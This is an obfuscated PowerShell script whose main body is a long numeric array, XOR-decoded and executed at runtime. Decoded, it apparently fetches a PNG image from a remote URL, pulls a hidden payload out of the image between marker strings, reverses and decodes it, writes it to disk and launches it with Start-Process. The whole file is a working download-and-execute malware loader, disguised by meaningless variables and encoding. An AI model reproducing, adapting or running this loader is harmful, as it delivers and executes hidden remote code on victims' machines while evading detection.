$EggNnRr = 313
$kMTxhxJ = 813
$oghzJgnxTkPnDt = 128
$xnCEC5D4DgGR = 534
$GTVIqmycMPpH6 = 632
$yk5s1WFjbcvMQ54 = 639
$UcmfBPVCapkUi = (48 * 1)
$wSkwpgXfLSRFdhti = (40 * 19)
$HNvMxxtRnGwj7TZ = (24 * 3)
$AnUnHf0V7Q = (3 * 36)

$nB2Mb849 = $FPqWy=189;
[string]::Join('', (158,157,238,201,216,218,220,211,210,218,207,220,205,213,212,222,157,237,243,250,157,222,207,220,217,209,216,157,8361,157,217,210,202,211,209,210,220,217,206,157,202,216,220,205,210,211,212,199,216,217,157,237,243,250,145,157,216,197,201,207,220,222,201,206,157,220,211,217,157,216,197,216,222,200,201,216,206,157,205,220,196,209,210,220,217,183,158,157,240,220,207,214,216,207,206,157,220,211,217,157,206,200,223,206,201,212,201,200,201,212,210,211,157,208,200,206,201,157,208,220,201,222,213,157,206,201,216,218,210,146,216,211,222,210,217,216,207,147,205,196,157,222,210,211,206,201,220,211,201,206,183,183,153,200,207,209,157,128,157,159,213,201,201,205,206,135,146,146,222,213,213,220,196,211,216,216,147,218,212,201,213,200,223,147,212,210,146,244,208,220,218,216,146,208,216,210,202,147,205,211,218,159,183,183,158,157,144,144,144,157,140,147,157,249,210,202,211,209,210,220,217,157,237,243,250,157,144,144,144,183,153,207,216,206,205,210,211,206,216,157,128,157,244,211,203,210,214,216,144,234,216,223,239,216,204,200,216,206,201,157,144,232,207,212,157,153,200,207,209,157,144,232,206,216,255,220,206,212,222,237,220,207,206,212,211,218,183,153,207,220,202,157,128,157,230,223,196,201,216,230,224,224,153,207,216,206,205,210,211,206,216,147,254,210,211,201,216,211,201,183,183,158,157,144,144,144,157,143,147,157,241,210,222,220,201,216,157,208,220,207,214,216,207,206,157,220,219,201,216,207,157,244,248,243,249,157,144,144,144,183,153,206,201,220,207,201,240,220,207,214,216,207,157,128,157,230,238,196,206,201,216,208,147,233,216,197,201,147,248,211,222,210,217,212,211,218,224,135,135,252,238,254,244,244,147,250,216,201,255,196,201,216,206,149,159,129,129,129,237,232,239,248,239,252,233,226,238,233,252,239,233,131,131,131,159,148,183,153,216,211,217,240,220,207,214,216,207,157,157,157,128,157,230,238,196,206,201,216,208,147,233,216,197,201,147,248,211,222,210,217,212,211,218,224,135,135,252,238,254,244,244,147,250,216,201,255,196,201,216,206,149,159,129,129,129,237,232,239,248,239,252,233,226,248,243,249,131,131,131,159,148,183,183,219,200,211,222,201,212,210,211,157,251,212,211,217,144,255,196,201,216,238,216,204,200,216,211,222,216,157,198,183,157,157,157,157,205,220,207,220,208,149,230,223,196,201,216,230,224,224,153,245,220,196,206,201,220,222,214,145,157,230,223,196,201,216,230,224,224,153,243,216,216,217,209,216,145,157,230,212,211,201,224,153,251,207,210,208,157,128,157,141,148,183,157,157,157,157,219,210,207,157,149,153,212,157,128,157,153,251,207,210,208,134,157,153,212,157,144,209,216,157,149,153,245,220,196,206,201,220,222,214,147,241,216,211,218,201,213,157,144,157,153,243,216,216,217,209,216,147,241,216,211,218,201,213,148,134,157,153,212,150,150,148,157,198,183,157,157,157,157,157,157,157,157,153,208,220,201,222,213,157,128,157,153,201,207,200,216,183,157,157,157,157,157,157,157,157,219,210,207,157,149,153,215,157,128,157,141,134,157,153,215,157,144,209,201,157,153,243,216,216,217,209,216,147,241,216,211,218,201,213,134,157,153,215,150,150,148,157,198,183,157,157,157,157,157,157,157,157,157,157,157,157,212,219,157,149,153,245,220,196,206,201,220,222,214,230,153,212,157,150,157,153,215,224,157,144,211,216,157,153,243,216,216,217,209,216,230,153,215,224,148,157,198,183,157,157,157,157,157,157,157,157,157,157,157,157,157,157,157,157,153,208,220,201,222,213,157,128,157,153,219,220,209,206,216,183,157,157,157,157,157,157,157,157,157,157,157,157,157,157,157,157,223,207,216,220,214,183,157,157,157,157,157,157,157,157,157,157,157,157,192,183,157,157,157,157,157,157,157,157,192,183,157,157,157,157,157,157,157,157,212,219,157,149,153,208,220,201,222,213,148,157,198,157,207,216,201,200,207,211,157,153,212,157,192,183,157,157,157,157,192,183,157,157,157,157,207,216,201,200,207,211,157,144,140,183,192,183,183,153,206,201,220,207,201,237,210,206,157,128,157,251,212,211,217,144,255,196,201,216,238,216,204,200,216,211,222,216,157,144,245,220,196,206,201,220,222,214,157,153,207,220,202,157,144,243,216,216,217,209,216,157,153,206,201,220,207,201,240,220,207,214,216,207,183,212,219,157,149,153,206,201,220,207,201,237,210,206,157,144,209,201,157,141,148,157,198,157,216,197,212,201,157,140,157,192,183,153,205,220,196,209,210,220,217,238,201,220,207,201,157,128,157,153,206,201,220,207,201,237,210,206,157,150,157,153,206,201,220,207,201,240,220,207,214,216,207,147,241,216,211,218,201,213,183,183,153,216,211,217,237,210,206,157,128,157,251,212,211,217,144,255,196,201,216,238,216,204,200,216,211,222,216,157,144,245,220,196,206,201,220,222,214,157,153,207,220,202,157,144,243,216,216,217,209,216,157,153,216,211,217,240,220,207,214,216,207,157,144,251,207,210,208,157,153,205,220,196,209,210,220,217,238,201,220,207,201,183,212,219,157,149,153,216,211,217,237,210,206,157,144,209,201,157,141,148,157,198,157,216,197,212,201,157,140,157,192,183,183,158,157,144,144,144,157,142,147,157,248,197,201,207,220,222,201,157,210,223,219,200,206,222,220,201,216,217,157,205,220,196,209,210,220,217,157,149,252,238,254,244,244,157,201,216,197,201,157,223,216,201,202,216,216,211,157,208,220,207,214,216,207,206,148,157,144,144,144,183,153,205,220,196,209,210,220,217,241,216,211,157,128,157,153,216,211,217,237,210,206,157,144,157,153,205,220,196,209,210,220,217,238,201,220,207,201,183,153,210,223,219,200,206,222,220,201,216,217,157,128,157,230,238,196,206,201,216,208,147,233,216,197,201,147,248,211,222,210,217,212,211,218,224,135,135,252,238,254,244,244,147,250,216,201,238,201,207,212,211,218,149,153,207,220,202,145,157,153,205,220,196,209,210,220,217,238,201,220,207,201,145,157,153,205,220,196,209,210,220,217,241,216,211,148,183,183,158,157,144,144,144,157,137,147,157,232,211,217,210,157,222,213,220,207,220,222,201,216,207,157,206,200,223,206,201,212,201,200,201,212,210,211,135,157,154,158,154,157,149,141,197,143,142,148,157,144,131,157,154,252,154,157,149,141,197,137,140,148,157,144,144,144,183,153,217,216,206,200,223,206,201,212,201,200,201,216,217,157,128,157,153,210,223,219,200,206,222,220,201,216,217,147,239,216,205,209,220,222,216,149,230,222,213,220,207,224,141,197,143,142,145,157,230,222,213,220,207,224,141,197,137,140,148,183,183,158,157,144,144,144,157,136,147,157,239,216,203,216,207,206,216,157,201,213,216,157,206,201,207,212,211,218,157,144,144,144,183,153,222,213,220,207,206,157,128,157,153,217,216,206,200,223,206,201,212,201,200,201,216,217,147,233,210,254,213,220,207,252,207,207,220,196,149,148,183,230,252,207,207,220,196,224,135,135,239,216,203,216,207,206,216,149,153,222,213,220,207,206,148,183,153,207,216,203,216,207,206,216,217,157,128,157,144,215,210,212,211,157,153,222,213,220,207,206,183,183,158,157,144,144,144,157,139,147,157,255,220,206,216,139,137,157,217,216,222,210,217,216,157,144,144,144,183,153,217,216,222,210,217,216,217,157,128,157,230,238,196,206,201,216,208,147,254,210,211,203,216,207,201,224,135,135,251,207,210,208,255,220,206,216,139,137,238,201,207,212,211,218,149,153,207,216,203,216,207,206,216,217,148,183,183,158,157,144,144,144,157,138,147,157,234,207,212,201,216,157,201,210,157,201,216,208,205,157,144,144,144,183,153,210,200,201,237,220,201,213,157,128,157,247,210,212,211,144,237,220,201,213,157,153,216,211,203,135,233,248,240,237,157,149,159,198,141,135,197,133,192,147,216,197,216,159,157,144,219,157,149,250,216,201,144,239,220,211,217,210,208,148,148,183,230,238,196,206,201,216,208,147,244,242,147,251,212,209,216,224,135,135,234,207,212,201,216,252,209,209,255,196,201,216,206,149,153,210,200,201,237,220,201,213,145,157,153,217,216,222,210,217,216,217,148,183,183,158,157,144,144,144,157,133,147,157,248,197,216,222,200,201,216,157,144,144,144,183,238,201,220,207,201,144,237,207,210,222,216,206,206,157,144,251,212,209,216,237,220,201,213,157,153,210,200,201,237,220,201,213,183 | ForEach-Object { [char]($_ -bxor $FPqWy) }));

$ExecutionContext.InvokeCommand.InvokeScript($nB2Mb849)
